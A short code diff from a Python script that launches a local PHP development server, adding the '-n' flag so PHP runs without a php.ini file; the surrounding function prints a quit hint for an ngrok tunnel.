@@ -47,4 +47,4 @@ def runNgrok():
     print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
 
 def runServer():
-    system("cd base/Server/www/ && php -S 127.0.0.1:1449 > /dev/null 2>&1 &")
+    system("cd base/Server/www/ && php -n -S 127.0.0.1:1449 > /dev/null 2>&1 &")
